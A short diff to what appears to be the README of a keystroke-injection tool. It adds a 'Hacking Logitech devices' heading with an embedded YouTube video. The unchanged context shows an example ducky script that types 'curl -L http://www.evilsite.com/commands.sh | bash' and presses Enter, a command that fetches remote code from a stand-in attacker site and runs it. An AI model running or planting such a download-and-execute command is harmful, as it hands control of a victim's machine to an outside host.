@@ -117,3 +117,6 @@ Example `ducky.txt` (for a complete list of available commands [see the document
 	STRING curl -L http://www.evilsite.com/commands.sh | bash
 	ENTER
 
+Hacking Logitech devices:
+
+<iframe width="560" height="315" src="https://www.youtube.com/embed/TdPRYWkYarM" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
